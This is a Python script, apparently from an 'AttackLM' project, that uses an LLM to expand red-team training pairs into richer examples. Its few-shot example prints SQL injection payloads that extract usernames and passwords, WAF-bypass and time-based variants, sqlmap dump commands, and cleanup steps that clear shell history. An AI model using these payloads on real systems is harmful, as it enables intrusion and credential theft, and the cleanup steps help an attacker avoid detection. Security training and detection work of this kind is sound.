        f"\n\nHere is an example of the CoT enhancement:\n{few_shot_text}"
    )

    user_content = (
        f"ORIGINAL QUESTION:\n{user_msg}\n\n"
        f"ORIGINAL ANSWER:\n{assistant_msg}\n\n"
        f"Add chain-of-thought reasoning before the answer using the <thinking>...</thinking> format. "
        f"Expand the final answer with more detail, edge cases, and detection information."
    )

    return [
        {"role": "system", "content": system_content},
        {"role": "user", "content": user_content},
    ]


# ---------------------------------------------------------------------------
# Strategy: CoT-Self-Instruct
# ---------------------------------------------------------------------------
COT_SELF_INSTRUCT_PROMPT = """\
You are an expert security researcher. Your task is to create a new, more complex \
security training example based on the following seed example.

First, analyze the seed:
1. What security domain does this belong to? (e.g., web exploitation, binary RE, \
network attacks, malware analysis, cloud security, ICS/OT)
2. What is the complexity level? (beginner, intermediate, advanced)
3. What MITRE ATT&CK techniques are involved?
4. What makes this a good training example?

Then, reason step-by-step about how to create a more challenging version:
5. How can you increase the technical depth?
6. What additional context or constraints would make this harder?
7. What follow-up questions would test deeper understanding?

Finally, generate the evolved training pair with:
- A more complex instruction that builds on the seed
- A detailed, technically accurate response
- Include specific tool commands, code snippets, or configuration examples where appropriate

Seed instruction: {instruction}
Seed response: {response}

Output format:
ANALYSIS:
<your analysis>

REASONING:
<your step-by-step reasoning>

EVOLVED:
<instruction>
<evolved instruction here>
</instruction>
<response>
<evolved response here>
</response>"""

_COT_SI_INPUT_USER = "How do I perform a UNION-based SQL injection?"

_COT_SI_INPUT_ASSISTANT = (
    "**SQL Injection — UNION-based**\n\n"
    "Use `' UNION SELECT 1,username,password FROM users--` in the vulnerable parameter to extract data.\n\n"
    "**Cleanup:** No persistent changes to DB."
)

_COT_SI_OUTPUT_ANALYSIS = (
    "1. Security domain: Web exploitation / SQL injection\n"
    "2. Complexity level: beginner — single-step injection with no WAF evasion\n"
    "3. MITRE ATT&CK: T1190 (Exploit Public-Facing Application), sub-technique SQL injection\n"
    "4. This is a good training example because it demonstrates the core UNION-based injection concept, "
    "but it lacks depth: no column enumeration, no WAF bypass techniques, no blind injection variants, "
    "and no detection artifact discussion."
)

_COT_SI_OUTPUT_REASONING = (
    "5. To increase technical depth, I should add: column count enumeration before the UNION, "
    "multiple extraction techniques (error-based, blind time-based), and automated tool usage (sqlmap).\n"
    "6. Additional constraints that would make this harder: WAF blocking common UNION patterns, "
    "requiring case alternation or comment injection bypasses, and scenarios where direct output "
    "is not visible (blind injection).\n"
    "7. Follow-up questions that test deeper understanding: How would you enumerate column count? "
    "How do you handle WAF blocking UNION/SELECT? What are the detection artifacts in web server logs?"
)

_COT_SI_OUTPUT_INSTRUCTION = (
    "Demonstrate a full UNION-based SQL injection attack against a web application, including "
    "column enumeration, data extraction, WAF bypass techniques, and automated exploitation "
    "with sqlmap. Include detection artifacts and cleanup steps."
)

_COT_SI_OUTPUT_RESPONSE = (
    "**Technique: Exploit Public-Facing Application — T1190 (SQL Injection — UNION-based)**\n\n"
    "**Overview:**\n"
    "UNION-based SQL injection exploits improper input sanitization in web application parameters "
    "to append a UNION SELECT statement, allowing the attacker to extract data from other database "
    "tables through the application's normal response. This is one of the most reliable injection "
    "techniques because it returns data directly in the HTTP response.\n\n"
    "**Prerequisites:**\n"
    "- Web application with user-controllable input in SQL queries\n"
    "- Application returns database content in the HTTP response\n"
    "- Error messages or distinguishable response patterns visible\n"
    "- sqlmap (optional, for automation)\n\n"
    "**Step-by-Step Execution:**\n"
    "```http\n"
    "GET /search?q=' UNION SELECT 1,username,password FROM users-- HTTP/1.1\n"
    "Host: target.local\n"
    "```\n\n"
    "**Step 1 — Confirm injectable parameter:**\n"
    "```sql\n"
    "-- Test with single quote to trigger error\n"
    "q=test'\n"
    "-- If error appears, confirm column count:\n"
    "q=' ORDER BY 1--   -- success\n"
    "q=' ORDER BY 2--   -- success\n"
    "q=' ORDER BY 3--   -- success\n"
    "q=' ORDER BY 4--   -- ERROR: column count is 3\n"
    "```\n\n"
    "**Step 2 — Extract data:**\n"
    "```sql\n"
    "q=' UNION SELECT 1,username,password FROM users--\n"
    "```\n\n"
    "**Step 3 — Automated with sqlmap:**\n"
    "```bash\n"
    "sqlmap -u 'http://target.local/search?q=test' --dbs --batch\n"
    "sqlmap -u 'http://target.local/search?q=test' -D app_db -T users --dump\n"
    "```\n\n"
    "**Edge Cases & Variations:**\n"
    "1. **WAF blocking UNION:** Use case alternation or comment injection:\n"
    "   ```sql\n"
    "   q=' UnIoN SeLeCt 1,username,password FrOm users--\n"
    "   q='/*!UNION*/ /*!SELECT*/ 1,username,password FROM users--\n"
    "   ```\n"
    "2. **Blind UNION (no visible output):** Use time-based or error-based:\n"
    "   ```sql\n"
    "   q=' UNION SELECT 1,SLEEP(5),3--\n"
    "   q=' UNION SELECT 1,IF(1=1,1,(SELECT 1 FROM information_schema.tables)),3--\n"
    "   ```\n\n"
    "**Detection Artifacts:**\n"
    "- Web server logs: 200/500 responses with SQL keywords (UNION, SELECT, FROM) in query params\n"
    "- WAF logs: UNION/SELECT keyword patterns blocked or flagged\n"
    "- Database audit: unusual SELECT queries from the application service account\n"
    "- SIEM: spike in HTTP 500 errors from /search endpoint within 5-minute window\n"
    "- Sysmon EID 1: sqlmap process execution on attacker machine\n"
    "- ModSecurity OWASP CRS: rule 942150 (UNION-based injection detected)\n\n"
    "**Cleanup:**\n"
    "```sql\n"
    "-- No persistent database changes made (read-only extraction)\n"
    "-- Clear browser history, proxy logs, and Burp/ZAP project files\n"
    "```\n"
    "```bash\n"
    "rm -rf ~/.sqlmap/output/target.local/\n"
    "history -c\n"
    "```"
)

COT_SELF_INSTRUCT_FEW_SHOT: list[dict] = [
    {
        "input": {
            "messages": [
                {"role": "system", "content": "You are a red team specialist."},
                {"role": "user", "content": _COT_SI_INPUT_USER},
                {"role": "assistant", "content": _COT_SI_INPUT_ASSISTANT},
            ],
            "source": "example",
        },
        "output": {
            "analysis": _COT_SI_OUTPUT_ANALYSIS,
            "reasoning": _COT_SI_OUTPUT_REASONING,
            "instruction": _COT_SI_OUTPUT_INSTRUCTION,
            "response": _COT_SI_OUTPUT_RESPONSE,
        },
    },
]


def build_cot_self_instruct_prompt(record: dict) -> list[dict]:
    """Build messages for the CoT-Self-Instruct evolution strategy.

    Returns a list of message dicts suitable for call_llm().
    The model first analyzes the seed, reasons about how to improve it,
    then generates an evolved training pair.
    """
    messages = record.get("messages", [])
    user_msg = ""
    assistant_msg = ""
    for msg in messages:
        if msg.get("role") == "user":
            user_msg = msg["content"]
        elif msg.get("role") == "assistant":
            assistant_msg = msg["content"]

    if not user_msg or not assistant_msg:
        return []

    # Build few-shot
    few_shot_text = ""
    for i, example in enumerate(COT_SELF_INSTRUCT_FEW_SHOT, 1):
        inp = example["input"]
        out = example["output"]
        few_shot_text += f"\n--- EXAMPLE {i} ---\n"
        few_shot_text += f"Seed instruction: {inp['messages'][1]['content']}\n"
        few_shot_text += f"Seed response: {inp['messages'][2]['content']}\n\n"
        few_shot_text += f"ANALYSIS:\n{out['analysis']}\n\n"
        few_shot_text += f"REASONING:\n{out['reasoning']}\n\n"
        few_shot_text += (
            f"EVOLVED:\n<instruction>\n{out['instruction']}\n</instruction>\n"
        )
        few_shot_text += f"<response>\n{out['response']}\n</response>\n"

    system_content = (
        "You are an expert security researcher creating advanced training data. "
        "Analyze the seed, reason step-by-step, then generate a more complex version.\n\n"
        f"{few_shot_text}"
    )

    user_content = COT_SELF_INSTRUCT_PROMPT.format(
        instruction=user_msg,
        response=assistant_msg,
    )

    return [
        {"role": "system", "content": system_content},
        {"role": "user", "content": user_content},
    ]


def construct_cot_self_instruct_output(
    original: dict,
    evolved_instruction: str,
    evolved_response: str,
    analysis: str,
    reasoning: str,
) -> dict:
    """Construct a CoT-Self-Instruct output record preserving provenance.

    Stores the analysis and reasoning as metadata alongside the evolved pair.
    """
    system_msg = next(
        (m for m in original.get("messages", []) if m.get("role") == "system"),
        {
            "role": "system",
            "content": "You are an authorized red team adversary emulation specialist.",
        },
    )

    output = {
        "messages": [
            system_msg,
            {"role": "user", "content": evolved_instruction},
            {"role": "assistant", "content": evolved_response},
        ],
        "source": original.get("source", "unknown"),
        "strategy": "cot_self_instruct",
    }

    # Preserve provenance fields
    for key in (
        "source_uri",
        "license",
        "license_uri",
        "rights_contact",
        "upstream_copyright",
        "upstream_license_uri",
        "attribution_required",
        "bsd_3_clause_notice",
        "derived_from",
        "mitre_ids",
        "platforms",
        "upstream_module_path",
    ):
        if key in original:
            output[key] = original[key]

    output["evolved_from"] = "original"
    output["evolved_timestamp"] = datetime.now(timezone.utc).isoformat()
    output["cot_analysis"] = analysis
    output["cot_reasoning"] = reasoning

    return output


def construct_evol_instruct_output(original: dict, evolved_content: str) -> dict:
    """Construct an evol_instruct output record preserving provenance."""
    # Use the original system message
    system_msg = next(
        (m for m in original.get("messages", []) if m.get("role") == "system"),
        {
            "role": "system",
            "content": "You are an authorized red team adversary emulation specialist.",
        },
    )
    user_msg = next(
        (m for m in original.get("messages", []) if m.get("role") == "user"),
    )

    output = {
        "messages": [
            system_msg,
            user_msg,
            {"role": "assistant", "content": evolved_content},
        ],
        "source": original.get("source", "unknown"),
        "strategy": "evol_instruct",
    }

    # Preserve provenance fields
    for key in (
        "source_uri",
        "license",
        "license_uri",
        "rights_contact",
        "upstream_copyright",
        "upstream_license_uri",
        "attribution_required",
        "bsd_3_clause_notice",
        "derived_from",
        "mitre_ids",
        "platforms",
        "upstream_module_path",
    ):
        if key in original:
            output[key] = original[key]

    output["evolved_from"] = "original"
    output["evolved_timestamp"] = datetime.now(timezone.utc).isoformat()

    return output


def construct_multi_turn_output(
    original: dict,
    conversation: list[dict],
) -> dict:
    """Construct a multi_turn output record from parsed conversation."""
    system_msg = next(
        (m for m in original.get("messages", []) if m.get("role") == "system"),
        {
            "role": "system",
            "content": "You are an authorized red team adversary emulation specialist.",
        },
    )

    # Build messages array: system, then alternating user/assistant
    messages = [system_msg]
    for msg in conversation:
        if msg.get("role") in ("user", "assistant"):
            messages.append({"role": msg["role"], "content": msg["content"]})

    # Validate role alternation
    if len(messages) < 4:  # system + at least 1 turn (user + assistant)
        return {}

    output = {
        "messages": messages,
        "source": original.get("source", "unknown"),
        "strategy": "multi_turn",
    }

    # Preserve provenance fields
    for key in (
        "source_uri",
        "license",
        "license_uri",
        "rights_contact",
        "upstream_copyright",
        "upstream_license_uri",
        "attribution_required",
        "bsd_3_clause_notice",
        "derived_from",
        "mitre_ids",
        "platforms",
        "upstream_module_path",
    ):
        if key in original:
            output[key] = original[key]

    output["evolved_from"] = "original"
    output["turns"] = (
        len([m for m in messages if m["role"] in ("user", "assistant")]) // 2
    )
    output["evolved_timestamp"] = datetime.now(timezone.utc).isoformat()

    return output


def construct_cot_output(
    original: dict,
    enhanced_content: str,
) -> dict:
    """Construct a CoT output record preserving provenance."""
    system_msg = next(
        (m for m in original.get("messages", []) if m.get("role") == "system"),
        {
            "role": "system",
            "content": "You are an authorized red team adversary emulation specialist.",
        },
    )
    user_msg = next(
        (m for m in original.get("messages", []) if m.get("role") == "user"),
    )

    output = {
        "messages": [
            system_msg,
            user_msg,
            {"role": "assistant", "content": enhanced_content},
        ],
        "source": original.get("source", "unknown"),
        "strategy": "cot",
    }

    # Preserve provenance fields
    for key in (
        "source_uri",
        "license",
        "license_uri",
        "rights_contact",
        "upstream_copyright",
        "upstream_license_uri",
        "attribution_required",
        "bsd_3_clause_notice",
        "derived_from",
        "mitre_ids",
        "platforms",
        "upstream_module_path",
    ):
        if key in original:
            output[key] = original[key]

    output["evolved_from"] = "original"
    output["evolved_timestamp"] = datetime.now(timezone.utc).isoformat()

    return output


# ---------------------------------------------------------------------------
# Response parsing
# ---------------------------------------------------------------------------
def parse_evol_instruct_response(raw: str, original: dict) -> dict | None:
    """Parse the LLM response for evol_instruct strategy.

    Returns a constructed output dict, or None if parsing fails.
    """
    content = raw.strip()

    # Remove any markdown code fences wrapping the entire response
    if content.startswith("```"):
        content = re.sub(r"^```(?:\w+)?\n?", "", content)
        content = re.sub(r"\n?```\s*$", "", content)
        content = content.strip()

    if len(content) < 100:
        return None

    return construct_evol_instruct_output(original, content)


def parse_multi_turn_response(raw: str, original: dict) -> dict | None:
    """Parse the LLM response for multi_turn strategy.

    Expects a JSON array of {role, content} message objects.
    Returns a constructed output dict, or None if parsing fails.
    """
    content = raw.strip()

    # Try to extract JSON array from the response
    # The model might wrap it in markdown code fences
    json_match = re.search(r"\[[\s\S]*\]", content)
    if not json_match:
        return None

    json_str = json_match.group(0)

    try:
        conversation = json.loads(json_str)
    except json.JSONDecodeError:
        # Try fixing common issues: trailing commas, unescaped quotes
        json_str_fixed = re.sub(r",\s*]", "]", json_str)
        json_str_fixed = re.sub(r",\s*}", "}", json_str_fixed)
        try:
            conversation = json.loads(json_str_fixed)
        except json.JSONDecodeError:
            return None

    if not isinstance(conversation, list):
        return None

    # Validate each message
    valid_messages: list[dict] = []
    for msg in conversation:
        if not isinstance(msg, dict):
            continue
        role = msg.get("role", "")
        text = msg.get("content", "")
        if role not in ("user", "assistant"):
            continue
        if not isinstance(text, str) or len(text.strip()) < 20:
            continue
        valid_messages.append({"role": role, "content": text})

    # Need at least 3 turns (6 message alternations)
    if len(valid_messages) < 6:
        return None

    # Check alternation
    for i in range(len(valid_messages)):
        expected_role = "user" if i % 2 == 0 else "assistant"
        if valid_messages[i]["role"] != expected_role:
            # Try to fix by swapping
            if i + 1 < len(valid_messages) and valid_messages[i]["role"] == "assistant":
                valid_messages[i], valid_messages[i + 1] = (
                    valid_messages[i + 1],
                    valid_messages[i],
                )

    return construct_multi_turn_output(original, valid_messages)


def parse_cot_response(raw: str, original: dict) -> dict | None:
    """Parse the LLM response for CoT injection strategy.

    Expects a response with <thinking>...</thinking> block followed by the answer.
    Returns a constructed output dict, or None if parsing fails.
    """
    content = raw.strip()

    # Remove any markdown code fences wrapping the entire response
    if content.startswith("```"):
        content = re.sub(r"^```(?:\w+)?\n?", "", content)
        content = re.sub(r"\n?```\s*$", "", content)
        content = content.strip()

    # Verify it has a thinking block
    if "<thinking>" not in content and "</thinking>" not in content:
        # Model didn't follow format — try to wrap what we got
        # Just use the content as-is without thinking block validation
        pass

    if len(content) < 100:
        return None

    return construct_cot_output(original, content)


def parse_cot_self_instruct_response(raw: str, original: dict) -> dict | None:
    """Parse the LLM response for CoT-Self-Instruct strategy.

    Expects a response with ANALYSIS, REASONING, and EVOLVED sections.
    The EVOLVED section contains <instruction>...</instruction> and
    <response>...</response> tags.

    Returns a constructed output dict with cot_analysis and cot_reasoning
    metadata, or None if parsing fails.
    """
    content = raw.strip()

    # Remove any markdown code fences wrapping the entire response
    if content.startswith("```"):
        content = re.sub(r"^```(?:\w+)?\n?", "", content)
        content = re.sub(r"\n?```\s*$", "", content)
        content = content.strip()

    # Extract ANALYSIS section
    analysis = ""
    analysis_match = re.search(
        r"ANALYSIS:\s*\n(.*?)(?=\nREASONING:)", content, re.DOTALL
    )
    if analysis_match:
        analysis = analysis_match.group(1).strip()

    # Extract REASONING section
    reasoning = ""
    reasoning_match = re.search(
        r"REASONING:\s*\n(.*?)(?=\nEVOLVED:)", content, re.DOTALL
    )
    if reasoning_match:
        reasoning = reasoning_match.group(1).strip()

    # Extract EVOLVED section
    evolved_section = ""
    evolved_match = re.search(r"EVOLVED:\s*\n(.*)", content, re.DOTALL)
    if evolved_match:
        evolved_section = evolved_match.group(1).strip()

    # Extract <instruction>...</instruction> from evolved section
    evolved_instruction = ""
    instr_match = re.search(
        r"<instruction>\s*(.*?)\s*</instruction>",
        evolved_section or content,
        re.DOTALL,
    )
    if instr_match:
        evolved_instruction = instr_match.group(1).strip()

    # Extract <response>...</response> from evolved section
    evolved_response = ""
    resp_match = re.search(
        r"<response>\s*(.*?)\s*</response>",
        evolved_section or content,
        re.DOTALL,
    )
    if resp_match:
        evolved_response = resp_match.group(1).strip()

    # Fallback: if XML tags not found, try splitting on section headers
    if not evolved_instruction and not evolved_response:
        # Try to find the instruction and response without XML tags
        # Use the full evolved section as response, original question as instruction
        if evolved_section:
            evolved_response = evolved_section.strip()
            # Use original user message as fallback instruction
            original_msgs = original.get("messages", [])
            for msg in original_msgs:
                if msg.get("role") == "user":
                    evolved_instruction = msg["content"]
                    break

    # Validate minimum content lengths
    if len(evolved_instruction) < 20 or len(evolved_response) < 100:
        return None

    return construct_cot_self_instruct_output(
        original=original,
        evolved_instruction=evolved_instruction,
        evolved_response=evolved_response,
        analysis=analysis,
        reasoning=reasoning,
    )


# ---------------------------------------------------------------------------
# Core processing
# ---------------------------------------------------------------------------
STRATEGY_NAMES = {"evol_instruct", "multi_turn", "cot", "cot_self_instruct", "all"}


def evolve_batch(
    records: list[dict],
    strategy: str,
    dry_run: bool = False,
    temperature: float | None = None,
) -> list[dict]:
    """Process a batch of records through a single evolve strategy.

    Returns list of evolved output records.
    """
    results: list[dict] = []
    parser_fn = {
        "evol_instruct": parse_evol_instruct_response,
        "multi_turn": parse_multi_turn_response,
        "cot": parse_cot_response,
        "cot_self_instruct": parse_cot_self_instruct_response,
    }[strategy]

    for record in records:
        # Build strategy-specific prompt
        if strategy == "evol_instruct":
            prompt_messages = build_evol_instruct_prompt(record)
        elif strategy == "multi_turn":
            prompt_messages = build_multi_turn_prompt(record)
        elif strategy == "cot":
            prompt_messages = build_cot_prompt(record)
        elif strategy == "cot_self_instruct":
            prompt_messages = build_cot_self_instruct_prompt(record)
        else:
            continue

        if not prompt_messages:
            continue

        if dry_run:
            print(f"\n{'=' * 70}")
            print(
                f"DRY RUN — {strategy} on record from '{record.get('source', 'unknown')}'"
            )
            print(f"{'=' * 70}")
            for msg in prompt_messages:
                role = msg["role"].upper()
                text = msg["content"][:500]
                print(f"\n--- {role} ---\n{text}...")
            print()
            continue

        # Call LLM
        llm_result = call_llm(prompt_messages, temperature=temperature)
        raw_content = llm_result["content"]

        if not raw_content.strip():
            print(f"  WARNING: Empty LLM response for {strategy}", file=sys.stderr)
            continue

        # Parse response
        parsed = parser_fn(raw_content, record)
        if parsed:
            # Add metrics
            parsed["llm_usage"] = llm_result["usage"]
            parsed["llm_latency_ms"] = llm_result["latency_ms"]
            results.append(parsed)
        else:
            print(
                f"  WARNING: Failed to parse {strategy} response, skipping",
                file=sys.stderr,
            )

    return results


def process_strategy(
    strategy: str,
    source: str | None,
    count: int | None,
    dry_run: bool,
    temperature: float | None,
    no_sleep: bool,
    cot_temperature: float | None = None,
) -> None:
    """Run a single strategy across source data."""
    # Discover and load input files
    source_files = discover_source_files(source)
    print(f"  Found {len(source_files)} JSONL file(s) for source '{source or 'all'}'")

    # Load records
    records = load_records(source_files, max_records=count)
    print(f"  Loaded {len(records)} unique records")

    if not records:
        print("  No valid records found. Exiting.", file=sys.stderr)
        return

    # Determine source name for output
    source_name = source or "all_sources"
    content_hash = hashlib.sha256(
        json.dumps(records[:10], sort_keys=True).encode()
    ).hexdigest()[:8]

    if dry_run:
        print(f"\n{'=' * 70}")
        print(f"DRY RUN — Strategy: {strategy}")
        print(f"{'=' * 70}")
        print(f"  Source: {source_name}")
        print(f"  Records: {len(records)}")
        print(f"  Temperature: {temperature or DEFAULT_TEMPERATURE}")
        print(f"  Backend: {BACKEND}")
        print()

        # Show dry-run for first 3 records only
        evolve_batch(records[:3], strategy, dry_run=True, temperature=temperature)
        return

    # Output directory
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    output_path = OUTPUT_DIR / f"{source_name}_{strategy}_{content_hash}.jsonl"
    raw_log_path = OUTPUT_DIR / f"{source_name}_{strategy}_{content_hash}_raw.log"

    # Open raw log for debugging
    raw_log = open(raw_log_path, "w", encoding="utf-8")

    all_results: list[dict] = []
    total_prompt_tokens = 0
    total_completion_tokens = 0
    total_latency_ms = 0.0
    temp = temperature if temperature is not None else DEFAULT_TEMPERATURE
    # For cot_self_instruct, prefer cot_temperature if provided
    effective_temp = temp
    if strategy == "cot_self_instruct" and cot_temperature is not None:
        effective_temp = cot_temperature
    backend = get_backend_info()

    # Calculate batches
    batch_size = PAIRS_PER_BATCH
    total_batches = max(1, (len(records) + batch_size - 1) // batch_size)

    print(
        f"\n[ {strategy} ]  {len(records)} records  |  "
        f"backend={BACKEND}  model={backend['model']}  temp={effective_temp}"
    )

    # Plain fallback: minimal live status line
    def _plain_status(
        batch_num: int,
        total_b: int,
        evolved: int,
        latency_ms: float,
        tok_count: int,
    ):
        tok_per_sec = tok_count / max(latency_ms / 1000, 0.001)
        pair_per_sec = evolved / max(latency_ms / 1000, 0.001)
        bar_len = 20
        filled = int(bar_len * batch_num / total_b)
        bar = "█" * filled + "░" * (bar_len - filled)
        line = (
            f"\r  {bar}  batch {batch_num}/{total_b}  "
            f"{evolved} evolved  "
            f"{tok_per_sec:,.0f} tok/s  {pair_per_sec:,.1f} pair/s  "
            f"{latency_ms:,.0f}ms"
        )
        print(line.ljust(100), end="", flush=True)

    progress_ctx = _rich_progress(total_batches, len(records))
    progress = None
    task_id = None

    try:
        if progress_ctx is not None:
            progress = progress_ctx.__enter__()
            task_id = progress.add_task(
                strategy,
                total=total_batches,
                pairs=0,
                target=len(records),
                tok_per_sec=0,
                pair_per_sec=0,
                latency_ms=0,
            )

        for batch_num in range(1, total_batches + 1):
            start_idx = (batch_num - 1) * batch_size
            end_idx = min(start_idx + batch_size, len(records))
            batch_records = records[start_idx:end_idx]

            batch_results = evolve_batch(
                batch_records, strategy, temperature=effective_temp
            )
            all_results.extend(batch_results)

            # Update progress
            batch_tok = sum(
                r.get("llm_usage", {}).get("total_tokens", 0) for r in batch_results
            )
            batch_latency = sum(r.get("llm_latency_ms", 0) for r in batch_results)
            total_prompt_tokens += sum(
                r.get("llm_usage", {}).get("prompt_tokens", 0) for r in batch_results
            )
            total_completion_tokens += sum(
                r.get("llm_usage", {}).get("completion_tokens", 0)
                for r in batch_results
            )
            total_latency_ms += batch_latency

            # Log raw responses
            for r in batch_results:
                raw_log.write(f"=== {strategy} evolved record ===\n")
                raw_log.write(json.dumps(r, indent=2, ensure_ascii=False)[:2000])
                raw_log.write("\n\n")
            raw_log.flush()

            if progress is not None and task_id is not None:
                tok_per_sec = batch_tok / max(batch_latency / 1000, 0.001)
                pair_per_sec = len(batch_results) / max(batch_latency / 1000, 0.001)
                progress.update(
                    task_id,
                    advance=1,
                    pairs=len(all_results),
                    tok_per_sec=tok_per_sec,
                    pair_per_sec=pair_per_sec,
                    latency_ms=batch_latency,
                )
            else:
                _plain_status(
                    batch_num,
                    total_batches,
                    len(all_results),
                    batch_latency,
                    batch_tok,
                )

            if not no_sleep and batch_num < total_batches:
                time.sleep(BATCH_PAUSE)

    finally:
        if progress is not None:
            progress_ctx.__exit__(None, None, None)
        else:
            print()  # newline after plain bar
        raw_log.close()

    # Write output
    with open(output_path, "w", encoding="utf-8") as fh:
        for entry in all_results:
            # Remove transient metrics before writing
            entry_to_write = {
                k: v
                for k, v in entry.items()
                if k not in ("llm_usage", "llm_latency_ms")
            }
            fh.write(json.dumps(entry_to_write, ensure_ascii=False) + "\n")

    # Summary
    elapsed_total = total_latency_ms / 1000
    avg_tok_per_sec = (total_prompt_tokens + total_completion_tokens) / max(
        elapsed_total, 0.001
    )
    avg_pair_per_sec = len(all_results) / max(elapsed_total, 0.001)

    print(
        f"  → Wrote {len(all_results)} evolved pairs  |  "
        f"{avg_tok_per_sec:,.0f} tok/s avg  |  "
        f"{avg_pair_per_sec:,.1f} pair/s avg  |  "
        f"{elapsed_total:.1f}s total  |  "
        f"{output_path.name}"
    )

    # Write metadata
    meta_path = OUTPUT_DIR / f"{source_name}_{strategy}_{content_hash}_meta.json"
    metadata = {
        "strategy": strategy,
        "source": source_name,
        "source_files": [f.name for f in source_files],
        "created": datetime.now(timezone.utc).isoformat(),
        "input_count": len(records),
        "output_count": len(all_results),
        "backend": BACKEND,
        "model": backend["model"],
        "temperature": temp,
        "metrics": {
            "total_batches": total_batches,
            "avg_tokens_per_sec": round(avg_tok_per_sec, 1),
            "avg_pairs_per_sec": round(avg_pair_per_sec, 2),
            "total_seconds": round(elapsed_total, 2),
            "prompt_tokens": total_prompt_tokens,
            "completion_tokens": total_completion_tokens,
        },
    }
    with open(meta_path, "w", encoding="utf-8") as fh:
        json.dump(metadata, fh, indent=2, ensure_ascii=False)

    if len(all_results) < len(records):
        print(
            f"  WARNING: Only evolved {len(all_results)}/{len(records)} records. "
            f"Some LLM responses could not be parsed."
        )


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(
        description="Evolve AttackLM training pairs into longer, richer examples.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python scripts/evolve_pairs.py --strategy evol_instruct --source metasploit-framework --count 500\n"
            "  python scripts/evolve_pairs.py --strategy multi_turn --source atomic-red-team --temperature 0.3\n"
            "  python scripts/evolve_pairs.py --strategy cot --source sigma-hq --count 200\n"
            "  python scripts/evolve_pairs.py --strategy all --count 100 --dry-run\n"
            "  python scripts/evolve_pairs.py --strategy evol_instruct --no-sleep\n"
        ),
    )
    parser.add_argument(
        "--strategy",
        type=str,
        required=True,
        choices=sorted(STRATEGY_NAMES),
        help=(
            "Evolution strategy to apply: "
            "'evol_instruct' (rewrite with depth), "
            "'multi_turn' (decompose into conversation), "
            "'cot' (inject chain-of-thought), "
            "'cot_self_instruct' (analyze-reason-generate with CoT), or "
            "'all' (run all four strategies)."
        ),
    )
    parser.add_argument(
        "--source",
        type=str,
        default=None,
        help=(
            "Source directory under data/datasets/buckets/sources/ to process. "
            "If not specified, processes all sources."
        ),
    )
    parser.add_argument(
        "--count",
        type=int,
        default=None,
        help="Maximum number of input records to evolve. Default: all records.",
    )
    parser.add_argument(
        "--temperature",
        type=float,
        default=DEFAULT_TEMPERATURE,
        help=(
            f"LLM temperature for generation (default: {DEFAULT_TEMPERATURE}). "
            "Lower = more consistent, higher = more varied. Range: 0.1-1.0."
        ),
    )
    parser.add_argument(
        "--cot-temperature",
        type=float,
        default=0.7,
        help=(
            "Temperature for CoT-Self-Instruct strategy only (default: 0.7). "
            "Higher than default to encourage more creative reasoning. "
            "Overrides --temperature when using cot_self_instruct strategy."
        ),
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        default=False,
        help="Print prompts without calling LLM.",
    )
    parser.add_argument(
        "--no-sleep",
        action="store_true",
        default=False,
        help="Remove the 2-second pause between batches for faster generation.",
    )

    args = parser.parse_args()

    # Validate temperature
    if not 0.1 <= args.temperature <= 1.0:
        parser.error(
            f"--temperature must be between 0.1 and 1.0, got {args.temperature}"
        )
    if not 0.1 <= args.cot_temperature <= 1.0:
        parser.error(
            f"--cot-temperature must be between 0.1 and 1.0, got {args.cot_temperature}"
        )

    backend = get_backend_info()

    print("AttackLM Training Pair Evolver")
    print(f"Backend:      {BACKEND}")
    print(f"URL:          {backend['url']}")
    print(f"Model:        {backend['model']}")
    print(f"Strategy:     {args.strategy}")
    print(f"Source:        {args.source or 'all'}")
    print(f"Count:        {args.count or 'all'}")
    print(f"Temperature:  {args.temperature}")
    if args.strategy in ("cot_self_instruct", "all"):
        print(f"CoT Temperature: {args.cot_temperature}")
    print(f"Output dir:   {OUTPUT_DIR}")
    if args.no_sleep:
        print("No-sleep:     enabled (no inter-batch pauses)")
    print()

    strategies = (
        ["evol_instruct", "multi_turn", "cot", "cot_self_instruct"]
        if args.strategy == "all"
        else [args.strategy]
    )

    for strategy in strategies:
        process_strategy(
            strategy=strategy,
            source=args.source,
            count=args.count,
            dry_run=args.dry_run,
            temperature=args.temperature,
            no_sleep=args.no_sleep,
            cot_temperature=args.cot_temperature,
        )

    if not args.dry_run:
        print(f"\nDone. Check {OUTPUT_DIR}/ for output files.")


if __name__ == "__main__":
    main()
